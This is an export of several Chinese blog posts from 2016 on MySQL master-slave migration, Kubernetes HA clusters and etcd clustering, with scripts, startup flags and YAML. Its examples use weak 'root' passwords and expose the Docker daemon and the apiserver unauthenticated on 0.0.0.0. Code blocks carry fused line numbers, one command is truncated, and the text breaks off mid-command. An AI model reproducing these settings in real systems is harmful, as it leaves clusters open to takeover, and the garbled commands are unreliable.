–u$USER –p$PASSWD $DATABASE &lt; $DATABASE.sql 为了更好的控制数据库的导入，有一些选项非常有用： -f ：插入过程中发生错误，仍会持续数据导入过程。比如导入$DATABASE.sql的过程中，如果发生主键冲突，我们仍能进行后续数据插入的过程，我们通过这种方式实现数据的覆盖，以及确保数据的一致性问题 主从数据库的搭建 1、在 master数据库上建立帐户并授权slave: 1GRANT REPLICATION SLAVE ON *.* to 'mysync'@'%' identified by 'root'; 2、然后查询 master 的状态： 1show master status; 3、配置 slave 数据库： 12mysql&gt;change master to master_host=$MASTER_IP,master_user='mysync',master_password='root', master_log_file='mysql-bin.000004',master_log_pos=308;mysql&gt;start slave; 4、检查从数据库的同步状态 1mysql&gt;show slave status; 要确保 12Slave_IO_Running: YesSlave_SQL_Running: Yes 两项必须为Yes状态，然后可以在 master 数据库上新增加一个数据库，在 slave 数据库上看是否能同步，如果同步了那么说明主从数据库搭建成功了。 检查迁移后的数据库是否一致 由于我们进行的是热备份，也就是在备份的过程中 master 仍然处于工作状态，所以在备份的过程中可能会发生主从数据库数据的不一致的情况。在这里我们通过比较主从数据库的每个表的记录数，来检查主从数据库是否达到一致。其脚本如下所示： 12345678910111213141516171819202122232425262728293031323334353637383940#!/bin/bashUSER=rootPASSWORD=rootHOSTNAME_1=$HOSTNAME_0HOSTNAME_2=$HOSTNAME_SLAVE_0HOSTNAME_3=$HOSTNAME_SLAVE_0DATABASE=$DATABASE_0if [ $# -ne 1 ]; then echo "$0: tables.list" exitfifunction query_count() &#123; if [ $# -ne 2 ]; then echo "Two Arg: Hostname and Table Name" return fi hostname=$1 tablename=$2 mysql -h$hostname -u$USER -p$PASSWORD $DATABASE \ -e"SELECT count(*) FROM $tablename" \ | grep ^[0-9]*$&#125;for table in $(cat $1)do sql="SELECT count(*) FROM $table;" count1=$(query_count $HOSTNAME_1 $table) count2=$(query_count $HOSTNAME_2 $table) count3=$(query_count $HOSTNAME_3 $table) echo "count1: $count1 count2:$count2 count3: $count3" if [ "$count1" != "$count2" ] &amp;&amp; [ "$count1" != "$count3" ]; then echo "$table is different" fidone 这个脚本可以检查两边数据库中记录项的不一致的情况，并打印哪些表出现了不一致的情况。 如何确保迁移后数据的一致性 如果发生了不一致，我们就需要弥补这些不一致的情况。具体做法如下： 1、根据数据一致性检查脚本判断哪些表名出现了不一致的情况，比如$TABLE出现了不一致的情况 2、登到 master 数据库，导出 $TABLE 这一天的数据到外部文件中，操作如下所示： 12select * from $TABLE where id&gt;8709218 into outfile '/home/work/liuchang/$TABLE.sql' fields terminated by ',' lines terminated by '\n'; 因为我们数据库表中的id字段是递增的，通过限制条件 id &gt; 8709218 选出了今天的数据，并把这些数据导入到文件中。 3、登陆 slave 数据库，从外部文件中导入 $TABLE 这一天的数据，操作如下所示： 1oad data local infile "/home/work/liuchang/SQL/$TABLE.sql" into table $TABLE fields terminated by ',' lines terminated by '\n'; 4、再检查两边的数据库中的一致性情况 最后 对于规模很大的数据库的备份，不建议使用 mysqldump 的形式进行备份，因为通过插入 SQL 语句恢复数据库的过程会十分缓慢。可以通过暂停 master 数据库，复制数据文件目录到 slave 数据库的数据目录下面，然后启动主从备份过程，这样的做法比较快速。 不过在备份 nlpc_stat（mysqldump了大约34G的SQL文件）的过程中，我们是通过先插入表的结构，然后开始了主从同步。之后再使用 mysql 导入之前mysqldump备份的文件和使用 load file 导入今天刚插入的记录，让它慢慢恢复到与 master 数据库的一致性。]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kubernetes HA集群搭建指南]]></title>
    <url>%2F2016%2F08%2F06%2FKubernetes-HA%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA%E8%AF%A6%E7%BB%86%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"><![CDATA[K8s HA集群的运行主要由k8s基本组件、etcd集群和docker运行环境组成的，其中etcd集群可以理解为k8s集群的数据库，它主要作用是服务发现、全局配置、以及保存一些路由相关的信息。为了保证k8s集群的高可用性，我们需要保证etcd存储数据的可靠性，所以在这个我们在搭建k8s集群的过程中搭建了一个etcd HA集群。我们搭建k8s HA集群的次序如下所示： 1、搭建etcd集群 2、启动k8s master组件 3、启动k8s node组件 搭建ETCD集群 etcd集群搭建的方式比较多，可以搭建一个全新的集群，也可以从已有的etcd中，将数据迁移到一个新集群上。 创建一个全新的集群 创建一个全新的集群过程比较简单，这里我们采取的是在三台机器上搭建了一个etcd集群。假如说etcd的运行路径为/home/work/etcd，我们需要手动创建一个data-dir文件夹用于保存etcd中的数据以及集群的一些属性信息，然后在每台机器上启动start-etcd.sh脚本： 123456#!/bin/bashHOSTNAME="http://sandbox-1"CLUSTER="etcd0=http://sandbox-3:2380,etcd1=http://sandbox-2:2380,etcd2=http://sandbox-1:2380"./bin/etcd --name etcd2 --data-dir /home/work/etcd/data-dir --advertise-client-urls "$HOSTNAME:2379","$HOSTNAME:4001" --listen-client-urls http://0.0.0.0:2379,http://0.0.0.0:4001 --initial-advertise-peer-urls "$HOSTNAME:2380" --listen-peer-urls http://0.0.0.0:2380 --initial-cluster-token etcd-cluster-1 --initial-cluster $CLUSTER --initial-cluster-state new &gt;&gt; ./log/etcd.log 2&gt;&amp;1 这里需要注意的是，在每台机器上启动时，需要将etcd name和hostname改下。具体搭建过程和测试过程，参考： Etcd集群搭建过程 数据迁移到一个新的etcd集群 这种方式下我们可以通过已有的etcd data-dir中的数据创建一个新的etcd集群，这个etcd集群会包含旧etcd的数据信息，这样就实现了etcd的数据迁移。当然也可以使用一个空的data-dir文件目录创建一个全新的集群。 大体思路：先以–force-cluster的方式创建一个仅含有一个节点的etcd集群，然后通过添加成员的方式，扩展成一个etcd集群。具体做法参考：Etcd数据迁移 创建Etcd集群中可能会遇到集群创建失败或者etcdctl无法连接本机端口等问题，请参考 常见问题列表（Q&amp;A）:1 启动master的组件 master组件主要包括：kube-apiserver、kube-controller-manager、kube-scheduler和flanneld，下面是k8s的master组件的启动过程： Kube-apiserver Kube-apiserver它作为集群资源对象的唯一操作入口，其他的所有组件必须通过它提供的API来操作资源数据，它的启动方式如下所示： 1../bin/kube-apiserver --logtostderr=true --v=4 --etcd_servers=http://sandbox-1:2379,http://sandbox-2:2379,http://sandbox-3:2379 --address=0.0.0.0 --allow_privileged=false --service-cluster-ip-range=10.254.0.0/16 --service-node-port-range=8000-40000 &gt;&gt; ./log/kube-apiserver.log 2&gt;&amp;1 这里我们必须为它指定etcd集群的地址，可以指定 --advertise-address 为本机的IP地址对外提供API服务，指定 --service-cluster-ip-range 限制集群服务的分配ip的范围，指定 --service-node-port-range 限制集群服务端口分配的范围等。 启动API Server的过程中可能遇到外部无法访问本机API Server服务或者绑定IP失败等问题，请参考常见问题列表（Q&amp;A）：2、3 Kube-controller-manager 它是集群内部的管理控制中心，其主要目的是实现k8s集群的故障检测和恢复的自动化工作，比如根据RC的定义完成Pod的复制或删除。它的启动如下所示： 1../bin/kube-controller-manager --logtostderr=true --v=4 --master=http://127.0.0.1:8080 --node-monitor-grace-period=10s --pod-eviction-timeout=10s --leader-elect=true &gt;&gt; ./log/kube-controller-manager.log 2&gt;&amp;1 kube-scheduler 集群中的调度器，负责Pod在集群节点上的调度分配。其启动方式如下所示： 1../bin/kube-scheduler --logtostderr=true --v=2 --master=http://127.0.0.1:8080 --leader-elect=true &gt;&gt; ./log/kube-scheduler.log 2&gt;&amp;1 flanneld 这里的flanneld以对外提供服务的方式运行的，它的主要作用包括为k8s集群设置一个网段，保证每个节点的网段不发生冲突，同时充当集群的路由功能等。 12etcdctl set /coreos.com/network/config '&#123;"Network": "10.1.0.0/16"&#125;'../bin/flanneld-server -v 16 -listen="0.0.0.0:8888" &gt;&gt; ./log/flanneld-server.log 2&gt;&amp;1 这里我们首先通过etcdctl set操作，设置了整个集群网络的IP范围，然后监听本地的8888端口，与flannel的客户端通信，协商每个flannel客户端节点的网络IP范围。 Flanneld启动过程中可能会发生启动失败，日志出现HTTP状态码500等，请参见 常见问题列表（Q&amp;A）：5 启动k8s node组件 k8s的node组件主要包括docker、flanneld、kubelet、kube-proxy，下面是k8s node组件的启动过程： flanneld 这个flanneld与master上运行的flanneld有些不同，这里的flanneld充当的是客户端的角色，它向master上的flanneld协商一个IP网段用于本地的Pod使用，并把这些信息记录在etcd中，一定程度上充当了路由的作用。它的启动选项如下所示： 12ETCD_CLUSTER="http://sandbox-1:2379,http://sandbox-2:2379,http://sandbox-3:2379"../bin/flanneld -etcd-endpoints=$ETCD_CLUSTER -remote=sandbox-1:8888 &gt;&gt; ./log/flannel.log 2&gt;&amp;1 我们这里需要为flanneld指定etcd集群的地址以及master上运行的flanneld地址。 Docker 目前我们的k8s版本是v1.3.3，它支持docker和rkt两种容器类型，在我们的生产环境中主要使用的是docker。Docker的运行环境搭建脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#!/bin/bashfunction mount_cgroup() &#123; #cgroup fs #set -e # for simplicity this script provides no flexibility # if cgroup is mounted by fstab, don't run # don't get too smart - bail on any uncommented entry with 'cgroup' in it if grep -v '^#' /etc/fstab | grep -q cgroup; then echo 'cgroups mounted from fstab, not mounting /sys/fs/cgroup' return 0 fi # kernel provides cgroups? if [ ! -e /proc/cgroups ]; then return 0 fi # if we don't even have the directory we need, something else must be wrong if [ ! -d /sys/fs/cgroup ]; then return 0 fi # mount /sys/fs/cgroup if not already done if ! mountpoint -q /sys/fs/cgroup; then mount -t tmpfs -o uid=0,gid=0,mode=0755 cgroup /sys/fs/cgroup fi cd /sys/fs/cgroup # get/mount list of enabled cgroup controllers for sys in $(awk '!/^#/ &#123; if ($4 == 1) print $1 &#125;' /proc/cgroups); do mkdir -p $sys if ! mountpoint -q $sys; then if ! mount -n -t cgroup -o $sys cgroup $sys; then rmdir $sys || true fi fi done # example /proc/cgroups: # #subsys_name hierarchy num_cgroups enabled # cpuset 2 3 1 # cpu 3 3 1 # cpuacct 4 3 1 # memory 5 3 0 # devices 6 3 1 # freezer 7 3 1 # blkio 8 3 1&#125;mount_cgroupmkdir Xcloud_install &gt;/dev/null 2&gt;&amp;1cd Xcloud_install# 下载docker-1.11的可执行文件，下面下载链接不可用了，从GitHub上可下载到wget ftp://docker-1.11.0.tgz &gt;/dev/null 2&gt;&amp;1mv /usr/bin/docker /usr/bin/docker.previoustar xf docker-1.11.0.tgzmv docker/* /usr/bin/pkill dockerrm -rf /home/work/docker_Xcloud 1&gt;/dev/null 2&gt;&amp;1rm /var/run/docker.pid 1&gt;/dev/null 2&gt;&amp;1rm ../Xcloud_install –rf 然后运行docker daemon，启动选项如下所示： 12345#!/bin/bashsource /run/flannel/subnet.envmkdir -p /home/work/docker/run 2&gt;/dev/null../bin/docker daemon -H unix:///var/run/docker.sock -H tcp://0.0.0.0:2375 --graph=/home/work/docker/runtime_1.11 --exec-root=/home/work/docker/run --insecure-registry=registry.Xcloud.com --bip=$&#123;FLANNEL_SUBNET&#125; --mtu=$&#123;FLANNEL_MTU&#125; &gt;&gt; ./log/docker.log 2&gt;&amp;1 这里需要注意的是，我们需要先将flannel子网的环境变量导入，然后再运行docker daemon，其中cgroup的挂载部分也很重要，具体过程在docker环境搭建的脚本中有所展示了。 启动Docker过程中可能会遇到docker启动失败的一些问题，请参考 常见问题列表（Q&amp;A）：4 Kubelet 负责本Node节点上的Pod的创建、修改、监控、删除等全生命周期管理，同时Kubelet定时“上报”本Node的状态信息到API Server里，它启动是否正常直接影响到整个Node节点主机是否可用，启动选项参考如下： 1../bin/kubelet --logtostderr=true --cadvisor-port=8194 --cluster_dns=10.254.88.188 --cluster_domain=Xcloud.local --v=4 --api_servers=http://127.0.0.1:8080 --address=0.0.0.0 --allow_privileged=false --pod-infra-container-image="registry.Xcloud.com/public/pause:1.0.2" --container-runtime="docker" &gt;&gt; ./log/kubelet.log 2&gt;&amp;1 我们定了cadvisor资源收集的端口8194，然后指定了API Server的地址，值得注意的是–pod-infra-container-image指定了我们以哪个版本的pause镜像作为启动其他镜像的基础镜像，因为在每个Pod运行的起始，内部镜像的启动停止过程都是由一个Pause镜像完成的。 Kubelet的启动过程可能会遇到无法创建Pod时无法下载镜像等问题，请参考常见问题（Q&amp;A）：6 Kube-proxy 它实现了Service的代理以及软件模式的负载均衡，主要是为节点间的通信进行服务。其启动选项参考如下： 1../bin/kube-proxy --logtostderr=true --v=4 --master=http://127.0.0.1:8080 &gt;&gt; ./log/kube-proxy.log 2&gt;&amp;1 我们指定了API Server的所在位置。 常见问题（Q&amp;A） 1、 按第一种方式创建一个全新的集群，通过etcdctl member list发生错误，无法连接本地的etcd服务端口 可能原因：新集群目前仅启动了一个etcd实例，造成当前集群中仅有一个etcd实例存活，直接造成集群不可用。因为etcd集群保证一致性的前提要满足M&gt;N/2（M：集群中健康的成员数 N:集群中总的成员数） 解决方法：继续在另外一台机器上启动一个etcd实例，使M&gt;N/2，再用etcdctl member list查看集群情况，或者通过第二种方式–force-new-cluster的方式启动集群，具体做法上文有详细描述。 2、 如果启动kube-apiserver的时候，发生了No valid IP bound类似的错误 可能原因：当前节点没有默认路由条目，造成kube-apiserver不知选哪个IP作为对外提供服务的地址 解决办法：为当前主机增加一个默认路由条目。首先查看一下本机的可用IP所在的网卡名称，然后依据本机的IP，设置一个默认路由。举个例子通过ifconfig查看本机的网卡名为：xgbe0和IP：10.207.182.18 然后增加一个默认路由 1ip route add default via 10.115.178.1 dev xgbe0 3、 启动后的API Server仅能通过本机的8080端口访问，例如 curl http://127.0.0.1:8080 可能原因：启动API Server时，默认绑定的是本机的127.0.0.1地址，也就是无法从外部使用API Server服务 解决办法：启动时添加选项–address=0.0.0.0 4、 Docker daemon启动起始就发生了错误 可能原因：没有挂载cgroup或者时没有缺少相应的可执行，比如在PATH路径中找不到docker-containerd、docker-runc等 解决办法：运行上述贴出来的Docker环境搭建脚本 5、 Master 节点上的flanneld启动失败的情况，日志出现返回状态码500的情况 可能原因：没有设置当前集群的网段，或者设置当前集群网段的操作有误 解决办法：在启动flanneld之前，先 1etcdctl set /coreos.com/network/config '&#123;"Network": "10.1.0.0/16"&#125;' 然后再启动flanneld进程。如果日志信息发生返回状态码HTTP500的情况，可以尝试通过 1etcdctl member list 查看哪台机器是etcd集群的leader，然后在这台机器上进行上述操作。 6、 Kubelet启动成功，但创建RC时，Pod的状态一直处于Pending，通过查看创建RC的事件发现kubelet pull pause镜像失败 可能原因：没有指定–pod-infra-container-image，kubelet会默认从gcr.io中拉取一个版本的pause镜像，但gcr.io中的镜像在国内的网络环境下，一般会被墙住，导致拉取失败，Pod启动不了。 解决办法：从国内某个镜像仓库中下载好google/pause镜像放到自己的私有仓库中，并指定–pod-infra-container-image选项为私有仓库的google/pause镜像]]></content>
      <tags>
        <tag>kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Etcd数据迁移]]></title>
    <url>%2F2016%2F07%2F24%2FEtcd%E6%95%B0%E6%8D%AE%E8%BF%81%E7%A7%BB%2F</url>
    <content type="text"><![CDATA[本文讲述从一个正在运行的 etcd 上，将数据迁移到一个包含三台 etcd 服务器组成的集群上，其中包含一些故障恢复和数据迁移的方法以及高可用 etcd 集群搭建方式的介绍。 数据迁移 在 inf-platform53 机器上运行着一个 etcd 服务器，其 data-dir 为 /var/lib/etcd/。我们要以 /var/lib/etcd 中的数据为基础，搭建一个包含三个节点的高可用的 etcd 集群，三个节点的主机名分别为： 123inf-platform53inf-platform56inf-platform60 初始化一个新的集群 我们先分别在上述三个节点上创建 /home/work/etcd/data-dir/ 文件夹当作 etcd 集群每个节点的数据存放目录。然后以 inf-platform60 节点为起点创建一个单节点的 etcd 集群，启动脚本 force-start-etcd.sh 如下： 12345#!/bin/bash# Don't start it unless etcd cluster has a heavily crash !../bin/etcd --name etcd2 --data-dir /home/work/etcd/data-dir --advertise-client-urls http://inf-platform60:2379,http://inf-platform60:4001 --listen-client-urls http://0.0.0.0:2379,http://0.0.0.0:4001 --initial-advertise-peer-urls http://inf-platform60:2380 --listen-peer-urls http://0.0.0.0:2380 --initial-cluster-token etcd-cluster-1 --initial-cluster etcd2=http://inf-platform60:2380 --force-new-cluster &gt; ./log/etcd.log 2&gt;&amp;1 这一步的 –force-new-cluster 很重要，可能是为了抹除旧 etcd 的一些属性信息，从而能成功的创建一个单节点 etcd 的集群。 这时候通过 1etcdctl member list 查看 peerURLs 指向的是不是 http://inf-platform60:2380 ? 如果不是，需要更新这个 etcd 的 peerURLs 的指向，否则这样在加入新的节点时会失败的。我们手动更新这个 etcd 的 peerURLs 指向 1etcdctl member update ce2a822cea30bfca http://inf-platform60:2380 添加etcd1成员 然后添加 inf-platform56 节点上的 etcd1 成员 1etcdctl member add etcd1 http://inf-platform56:2380 注意要先添加 etcd1 成员后，再在 inf-platform56 机器上启动这个 etcd1 成员 这时候我们登陆上 inf-platform56 机器上启动这个 etcd1 实例，启动脚本 force-start-etcd.sh 如下： 12345#!/bin/bash# Don't start it unless etcd cluster has a heavily crash !../bin/etcd --name etcd1 --data-dir /home/work/etcd/data-dir --advertise-client-urls http://inf-platform56:2379,http://inf-platform56:4001 --listen-client-urls http://0.0.0.0:2379,http://0.0.0.0:4001 --initial-advertise-peer-urls http://inf-platform56:2380 --listen-peer-urls http://0.0.0.0:2380 --initial-cluster-token etcd-cluster-1 --initial-cluster etcd2=http://inf-platform60:2380,etcd1=http://inf-platform56:2380 --initial-cluster-state existing &gt; ./log/etcd.log 2&gt;&amp;1 注意在这个节点上我们先把 data-dir 文件夹中的数据删除（如果有内容的情况下），然后设置 --initial-cluster 和 --initial-cluster-state。 添加 etcd0 成员 这时候我们可以通过 1etcdctl member list 观察到我们新加入的节点了，然后我们再以类似的步骤添加第三个节点 inf-platform53 上 的 etcd0 实例 1etcdctl member add etcd0 http://inf-platform53:2380 然后登陆到 inf-platform53 机器上启动 etcd0 这个实例，启动脚本 force-start-etcd.sh 如下： 12345#!/bin/bash# Don't start it unless etcd cluster has a heavily crash !../bin/etcd --name etcd0 --data-dir /home/work/etcd/data-dir --advertise-client-urls http://inf-platform53:2379,http://inf-platform53:4001 --listen-client-urls http://0.0.0.0:2379,http://0.0.0.0:4001 --initial-advertise-peer-urls http://inf-platform53:2380 --listen-peer-urls http://0.0.0.0:2380 --initial-cluster-token etcd-cluster-1 --initial-cluster etcd2=http://inf-platform60:2380,etcd1=http://inf-platform56:2380,etcd0=http://inf-platform53:2380 --initial-cluster-state existing &gt; ./log/etcd.log 2&gt;&amp;1 过程同加入 etcd1 的过程相似，这样我们就可以把单节点的 etcd 数据迁移到一个包含三个 etcd 实例组成的集群上了。 大体思路 先通过 --force-new-cluster 强行拉起一个 etcd 集群，抹除了原有 data-dir 中原有集群的属性信息（内部猜测），然后通过加入新成员的方式扩展这个集群到指定的数目。 高可用etcd集群方式（可选择） 上面数据迁移的过程一般是在紧急的状态下才会进行的操作，这时候可能 etcd 已经停掉了，或者节点不可用了。在一般情况下如何搭建一个高可用的 etcd 集群呢，目前采用的方法是用 supervise 来监控每个节点的 etcd 进程。 在数据迁移的过程中，我们已经搭建好了一个包含三个节点的 etcd 集群了，这时候我们对其做一些改变，使用supervise 重新拉起这些进程。 首先登陆到 inf-platform60 节点上，kill 掉 etcd 进程，编写 etcd 的启动脚本 start-etcd.sh，其中 start-etcd.sh 的内容如下： 123#!/bin/bash../bin/etcd --name etcd2 --data-dir /home/work/etcd/data-dir --advertise-client-urls http://inf-platform60:2379,http://inf-platform60:4001 --listen-client-urls http://0.0.0.0:2379,http://0.0.0.0:4001 --initial-advertise-peer-urls http://inf-platform60:2380 --listen-peer-urls http://0.0.0.0:2380 --initial-cluster-token etcd-cluster-1 --initial-cluster etcd2=http://inf-platform60:2380,etcd1=http://inf-platform56:2380,etcd0=http://inf-platform53:2380 --initial-cluster-state existing &gt; ./log/etcd.log 2&gt;&amp;1 然后使用 supervise 执行 start-etcd.sh 这个脚本，使用 supervise 启动 start-etcd.sh 的启动脚本 etcd_control 如下： 12345678910111213141516171819202122232425262728293031#!/bin/shif [ $# -ne 1 ]; then echo "$0: start|stop"fiwork_path=`dirname $0`cd $&#123;work_path&#125;work_path=`pwd`supervise=$&#123;work_path&#125;/supervise/bin/supervise64.etcdmkdir -p $&#123;work_path&#125;/supervise/status/etcdcase "$1" instart) killall etcd supervise64.etcd $&#123;supervise&#125; -f "sh ./start-etcd.sh" \ -F $&#123;work_path&#125;/supervise/conf/supervise.conf \ -p $&#123;work_path&#125;/supervise/status/etcd echo "START etcd daemon ok!";;stop) killall etcd supervise64.etcd if [ $? -ne 0 ] then echo "STOP etcd daemon failed!" exit 1 fi echo "STOP etcd daemon ok!" 这里为什么不直接用 supervise 执行 etcd 这个命令呢，反而以一个 start-etcd.sh 脚本的形式启动这个 etcd 呢？原因在于我们需要将 etcd 的输出信息重定向到文件中，如果直接在 supervise 的 command 进行重定向，将发生错误。 分别登陆到以下两台机器 inf-platform56 inf-platform53 上进行同样的操作，注意要针对每个节点的不同修改对应的etcd name 和 peerURLs 等。 常见问题 1、etcd 读取已有的 data-dir 数据而启动失败，常常表现为cluster id not match什么的 可能原因是新启动的 etcd 属性与之前的不同，可以尝 --force-new-cluster 选项的形式启动一个新的集群 2、etcd 集群搭建完成后，通过 kubectl get pods 等一些操作发生错误的情况 目前解决办法是重启一下 apiserver 进程 3、还是 etcd启动失败的错误，大多数情况下都是与data-dir 有关系，data-dir 中记录的信息与 etcd启动的选项所标识的信息不太匹配造成的 如果能通过修改启动参数解决这类错误就最好不过的了，非常情况下的解决办法： 一种解决办法是删除data-dir文件 一种方法是复制其他节点的data-dir中的内容，以此为基础上以 --force-new-cluster 的形式强行拉起一个，然后以添加新成员的方式恢复这个集群，这是目前的几种解决办法]]></content>
      <tags>
        <tag>Etcd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kubernetes高可用集群部署方案]]></title>
    <url>%2F2016%2F07%2F07%2FKubernetes%E9%AB%98%E5%8F%AF%E7%94%A8%E9%9B%86%E7%BE%A4%E7%9A%84%E9%83%A8%E7%BD%B2%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[写在前面 这篇文章将介绍如何搭建一个高可用的kubernetes集群，主要参考的文档是：http://kubernetes.io/docs/admin/high-availability/。高可用性是一种需求，有多种选择可以实现这个需求，这里我们采用了最简单的方式搭建了这个集群，即在单个master节点的集群的基础上，部署一个高可用的Etcd集群、创建多个master Pod，并建立了一个对应的Service以实现多个master的负载均衡，最后将所有的Work Node全部注册到Service暴露的端口上。下面是集群的架构部署图： 注：这种高可用部署方案不可行，存在单点问题，查看另一篇文章的解决方案: Kubernetes HA集群搭建详细指南 高可用的部署过程 按照架构图的部署方式，需要做以下几步： 1、部署一个单master节点的Cluster 1#，单个master的集群部署方式比较简单，详情参考：https://get.k8s.io 2、其次我们应该部署一个高可用的Etcd集群Cluster 2#，详情参考：高可用Etcd集群搭建过程 3、在Cluster 1#中新建几个Pod，这个Pod里面运行着master所需要的全部组件 4、设置一个Service，以NodePort的方式暴露Pod里面的master的服务 5、加入新的Node节点注册到Service上，成为我们的工作集群Cluster 3#。 这个过程中比较麻烦的可能是Etcd集群了，搭建过程并不复杂，主要是如何以Pod的形式搭建成一个集群，还没有解决。现在的解决方法是在三台机器上以Docker的形式运行这些etcd服务，但这样的做法，如果遇到要进行Etcd集群扩展，就需要重启Pod里面的master镜像。 创建Pod形式的master镜像 有一点需要注意的是，如果master节点挂了之后，运行着的实例或者服务不受影响的。所以即使Cluster 1#挂了之后，我们的Cluster 3#还可以正常工作的，我们只要保持Cluster 3#的高可用性就可以了。引用Cluster 1#的目的是，我们想借用Kubernetes提供的负载均衡服务。 我们在Cluster 1#里面运行多个master的Pod镜像，通过kube-master-rc.yaml来创建三个Pod实例。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970apiVersion: v1kind: ReplicationControllermetadata: name: kube-master-replication-controllerspec: replicas: 3 selector: name: kube-master-replication-controller template: metadata: labels: name: kube-master-replication-controller spec: volumes: - hostPath: path: /srv/kubernetes name: srvkube - hostPath: path: /var/log/ name: logfile containers: - name: kube-apiserver image: registry.abc.com/liuchang31/kube-apiserver:v1.3.0-alpha.3 command: - /bin/sh - -c - /usr/local/bin/kube-apiserver --logtostderr=true --v=4 --etcd-servers=http://inf-platform55:2379,http://inf-platform56:2379,http://inf-platform57:2379 --address=0.0.0.0 --allow_privileged=false --service-cluster-ip-range=10.200.0.0/16 --service-node-port-range=8000-40000 &gt;&gt; /var/log/kube-apiserver.log ports: - containerPort: 7080 hostPort: 7080 name: http - containerPort: 8080 hostPort: 8080 name: local volumeMounts: - mountPath: /srv/kubernetes name: srvkube readOnly: true - mountPath: /var/log/ name: logfile - name: kube-scheduler image: registry.abc.com/liuchang31/kube-scheduler:v1.3.0-alpha.3 command: - /bin/sh - -c - /usr/local/bin/kube-scheduler --master=http://localhost:8080 --v=0 --logtostderr=true --leader-elect=true &gt;&gt; /var/log/kube-scheduler.log livenessProbe: httpGet: path: /healthz port: 10251 initialDelaySeconds: 15 timeoutSeconds: 1 volumeMounts: - mountPath: /var/log/ name: logfile - name: kube-controller-manager image: registry.abc.com/liuchang31/kube-controller-manager:v1.3.0-alpha.3 command: - /bin/sh - -c - - /usr/local/bin/kube-controller-manager --master=http://localhost:8080 --logtostderr=true --v=4 --node-monitor-grace-period=10s --pod-eviction-timeout=10s --leader-elect=true &gt;&gt; /var/log/kube-conttroller-manager.log livenessProbe: httpGet: path: /healthz port: 10252 initialDelaySeconds: 15 timeoutSeconds: 1 volumeMounts: - mountPath: /var/log/ name: logfile 注意在kube-apiserver的etcd_servers选项中，我们需要填上Cluster 2#的地址。还需要注意的是，要在kube-controller-manager和kube-scheduler的选项添加—leader-elect=true的选项，这为了保证同一时刻只能有一个master进行管理和调度。 创建Service以实现负载均衡 这一步很简单，可以通过定义kube-master-service.yaml来创建一个Service实例： 123456789101112131415apiVersion: v1kind: Servicemetadata: name: kube-master-server labels: name: kube-master-serverspec: selector: name: kube-master-replication-controller type: NodePort ports: - name: api port: 8080 targetPort: 8080 nodePort: 8188 这里需要注意的是，因为我们这个Service要当作负载均衡器，成为Cluster 3# api_server的接入点，所以它应该要暴露出来，以NodePort或者LoadBalance的方式，这里我们选择的是NodePort的形式，nodePort为8188。 Cluster 3#的组建 为什么上述Pod里的3份master实例就可以实现高可用了呢？会不会有冲突？数据会不一致吗？需要理解这一点，最关键的Etcd集群的特性，它保持了全局的key/value存储的一致性，也就是说3个master都是通过Etcd集群或者当前集群（也就是Cluster 3#）的情况，无论负载均衡器将请求送到了哪个master，最后都是要通过获取Etcd集群里面的数据进行操作的，而Etcd集群在那篇文章中已经验证了，它能保证分布式存储的一致性。 Cluster 3#集群是我们的工作集群，我们可以把一定数目的Work Node机器加入到这个集群上，做法比较简单。首先部署Node上的运行环境，比如说kube-proxy、docker等，然后我们通过启动kubelet向我们的master注册信息，在命令行输入： 1kubelet --logtostderr=true --cadvisor-port=8194 --cluster_dns=10.254.88.188 --cluster_domain=Xcloud.local --v=4 --api_servers=http://inf-platform53:8188 --address=0.0.0.0 --allow_privileged=false --docker-root=/home/work/docker/runtime/ 注意这个cluster-dns我们采用的是Cluster 1#的DNS，它用作域名发现。其次我们把—api_servers设为我们的Service对外提供的地址，即NodeIP+nodePort的形式。至此我们的高可用集群的部署就算是完成了，操作过程中可能会遇到各种各样的问题，不过都可以通过查看log一点点解决，大方向是这么走的。 我们通过在Cluster 1#集群上通过 1kubectl describe pods kube-master 查看我们的master的落在哪几台机器上，这几台机器都是Cluster 3#的master节点，可以在这几台机器通过输入 kubectl get nodes 来查看集群Cluster 3#的情况。]]></content>
      <tags>
        <tag>kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Etcd集群搭建]]></title>
    <url>%2F2016%2F06%2F27%2FEtcd%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[Etcd集群简介 随着CoreOS和Kubernetes等项目在开源社区日益火热，它们项目中都用到的etcd组件作为一个高可用强一致性的服务发现存储仓库，渐渐为开发人员所关注。在云计算时代，如何让服务快速透明地接入到计算集群中，如何让共享配置信息快速被集群中的所有机器发现，更为重要的是，如何构建这样一套高可用、安全、易于部署以及响应快速的服务集群，已经成为了迫切需要解决的问题，etcd为解决这类问题带来了福音。 我们此次在三个主机上搭建了一个包含三个Etcd节点的集群，实现了集群的动态扩展和收缩，并测试和验证了Etcd集群键——值存储的一致性和高可用性。本文主要参考了：https://github.com/coreos/etcd/blob/release-2.3/Documentation/docker_guide.md 拉取镜像ectd 从 https://quay.io/ 获取etcd最新版本的镜像，本次拉取的是v2.3.7版本。首先拉取到本地： 1docker pull quay.io/coreos/etcd 再给这个镜像打上 tag，并推送到 sofacloud 仓库 12docker tag quay.io/coreos/etcd:latest registry.abc.com/liuchang31/etcd:v2.3.7docker push registry.abc.com/liuchang31/etcd:v2.3.7 搭建Etcd集群 这里采用的是DNS发现方式搭建的集群，也就是要求集群中的每台主机都可以做DNS的主机名到IP的查询。 我们选取的三台主机分别为： 123inf-platform55inf-platform56inf-platform57 在主机 inf-platform55 上新建一个 start.sh 文件，内容如下： 12345678910111213docker run -d -v /home/work/docker/liuchang/etcd/ca-certificates/:/etc/ssl/certs \ -v /home/work/docker/liuchang/etcd/data-dir:/home/work/docker/etcd/data \ -p 4001:4001 -p 2380:2380 -p 2379:2379 \ --name etcd registry.abc.com/liuchang31/etcd:v2.3.7 \ -name etcd0 \ -data-dir /home/work/docker/etcd/data \ -advertise-client-urls http://inf-platform55:2379,http://inf-platform55:4001 \ -listen-client-urls 